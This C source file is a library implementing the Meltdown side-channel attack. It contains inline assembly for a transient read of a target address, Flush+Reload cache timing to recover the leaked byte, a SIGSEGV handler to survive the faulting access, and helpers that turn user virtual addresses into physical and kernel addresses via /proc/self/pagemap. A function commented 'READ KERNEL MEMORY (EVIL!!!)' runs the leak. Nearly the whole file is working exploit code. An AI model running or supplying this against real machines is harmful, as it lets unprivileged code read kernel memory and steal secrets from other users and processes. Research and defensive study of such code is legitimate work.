#include "meltdown.h"

// GLOBAL VARIABLES ---------------------------------------------------------------------------------------

// Enable/disable debug statements on stdout
int debug_mode = 0;

meltdown_config_t meltdown_config;
static jmp_buf jump_buffer;
static char *mem = NULL, *_mem = NULL;
static size_t phys = 0;
static pthread_t *threads;

// DEBUGGING ----------------------------------------------------------------------------------------------
static void debug(debug_symbol_t symbol, const char *function_name, const char *format, ...) {
	if (!debug_mode) return;
	if (symbol == ERROR) printf("\x1b[31;1m[-][%s]\x1b[0m ", function_name);
	else if (symbol == INFO) printf("\x1b[33;1m[.][%s]\x1b[0m ", function_name);
	else if (symbol == SUCCESS) printf("\x1b[32;1m[+][%s]\x1b[0m ", function_name);
	va_list argp;
	va_start(argp, format);
	vfprintf(stdout, format, argp);
	va_end(argp);
}

// ASSEMBLY CODES -----------------------------------------------------------------------------------------
static inline uint64_t rdtscp() {
	uint64_t a = 0, d = 0;
	asm volatile("mfence");
	asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
	a = (d << 32) | a;
	asm volatile("mfence");
	return a;
}

static inline void maccess(void *address) {
	asm volatile("movq (%0), %%rax\n" : : "c"(address) : "rax");
}

static inline void flush(void *address) {
	asm volatile("clflush 0(%0)\n" : : "c"(address) : "rax");
}

#define MELTDOWN                                                               \
  asm volatile("1:\n"                                                          \
               "movzx (%%rcx), %%rax\n"                                        \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(phys), "b"(mem)                                           \
               : "rax");

// FLUSH + RELOAD -----------------------------------------------------------------------------------------
static int __attribute__((always_inline)) flush_reload(void *address) {
	uint64_t start = 0, end = 0;
	start = rdtscp();
	maccess(address);
	end = rdtscp();
	flush(address);
	return (end - start < meltdown_config.cache_miss_threshold)? 1: 0;
}

// SEGMENTATION FAULT HANDING -----------------------------------------------------------------------------
static void unblock_signal(int signal_number __attribute__((__unused__))) {
  sigset_t signal_set;
  sigemptyset(&signal_set);
  sigaddset(&signal_set, signal_number);
  sigprocmask(SIG_UNBLOCK, &signal_set, NULL);
}

static void segfault_handler(int signal_number) {
  (void)signal_number;
  unblock_signal(SIGSEGV);
  longjmp(jump_buffer, 1);
}

int __attribute__((optimize("-Os"), noinline)) read_signal_handler() {
	uint64_t retries = meltdown_config.retries + 1;
	uint64_t start = 0, end = 0;

	while (retries--) {
		if (!setjmp(jump_buffer)) {
			MELTDOWN;
		}
		int i;
		for (i=0; i<256; i++) {
			if (flush_reload(mem + (i<<12))) {
				if (i >= 1) return i;
			}
			sched_yield();
		}
		sched_yield();
	}
	return 0;
}

// EXIT ---------------------------------------------------------------------------------------------------
int meltdown_exit() {
	signal(SIGSEGV, SIG_DFL);
	free(_mem);
	int j;
	for (j = 0; j < meltdown_config.thread_count; j++) {
		pthread_cancel(threads[j]);
	}
	debug(SUCCESS, "meltdown_exit", "Everything is done, good bye!\n");
	return 0;
}

// THREAD FUNCTION ----------------------------------------------------------------------------------------
static void *yield_thread(void *ignore) {
	while (1) {
		sched_yield();
	}
}

// INIT ---------------------------------------------------------------------------------------------------
int meltdown_init() {
	// Initializing default configuration
	meltdown_config.physical_offset = DEFAULT_PHYSICAL_OFFSET;
	meltdown_config.cache_miss_threshold = 200llu;
	meltdown_config.retries = 1000000llu;
	meltdown_config.measurements = 3ull;
	meltdown_config.accept_after = 2ull;
	meltdown_config.thread_count = 1ull;

	int j;
	_mem = malloc(4096 * 300);
	if (!_mem) return -1;
	mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
	memset(mem, 0xab, 4096 * 290);

	for (j=0; j<256; j++) {
		flush(mem + (j>>12));
	}

	// Setting up some threads for load
	threads = malloc(sizeof(pthread_t) * meltdown_config.thread_count);
	for (j = 0; j < meltdown_config.thread_count; j++) {
		int r = pthread_create(&threads[j], 0, yield_thread, 0);
		if (r != 0) {
			int k;
			for (k = 0; k < j; k++) {
			pthread_cancel(threads[k]);
			}
			free(threads);
			free(_mem);
			debug(ERROR, "meltdown_init", "Failed to start threads\n");
			return -1;
		}
	}
	debug(SUCCESS, "meltdown_init", "Started %d load threads\n", meltdown_config.thread_count);

	// Signal handler is set here
	if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
		debug(ERROR, "meltdown_init", "Failed to set signal handler\n");
		meltdown_exit();
		return -1;
	}
	debug(SUCCESS, "meltdown_init", "Successfully set signal handler\n");

	return 0;
}

// READ KERNEL MEMORY (EVIL!!!) ---------------------------------------------------------------------------
int __attribute__((optimize("-O0"))) meltdown_read(size_t addr) {
	phys = addr;

	char res_stat[256];
	int i, j, r;
	for (i = 0; i < 256; i++)
		res_stat[i] = 0;

	sched_yield();

	for (i=0; i<meltdown_config.measurements; i++) {
		r = read_signal_handler();
		res_stat[r]++;
	}

	int max_v = 0, max_i = 0;
	for (i = 1; i < 256; i++) {
		if (res_stat[i] > max_v && res_stat[i] >= meltdown_config.accept_after) {
			max_v = res_stat[i];
			max_i = i;
		}
	}
	return max_i;
}

// USER VIRTUAL TO PHYSICAL -------------------------------------------------------------------------------
uint64_t virtual_to_physical(uint64_t virtual_address) {
	static int pagemap = -1;
	if (pagemap == -1) {
		// self pagemap not yet opened
		pagemap = open("/proc/self/pagemap", O_RDONLY);
		if (pagemap < 0) {
			debug(ERROR, "virtual_to_physical", "Unable to open /proc/self/pagemap\n");
			return -1;
		}
	}

	uint64_t page_frame_number, offset = (virtual_address >> 12) << 3;
	int bytes_read = pread(pagemap, &page_frame_number, 8, offset);
	if (bytes_read != 8) {
		debug(ERROR, "virtual_to_physical", "Could not read 8 bytes from /proc/self/pagemap at offset%lx\n", offset);
		return -1;
	}

	page_frame_number &= 0x7FFFFFFFFFFFFF;
	return (page_frame_number << 12) | virtual_address & 0xFFF;
}

// PHYSICAL TO KERNEL VIRTUAL -----------------------------------------------------------------------------
uint64_t physical_to_virtual(uint64_t physical_address) {
	uint64_t virtual_address = physical_address + meltdown_config.physical_offset;
	if (virtual_address < meltdown_config.physical_offset) {
		debug(INFO, "physical_to_virtual", "Dont know this case %lx?\n", physical_address);
		return physical_address;
	}
	if (physical_address >= (1ull<<46)) return -1;
	return virtual_address;
}
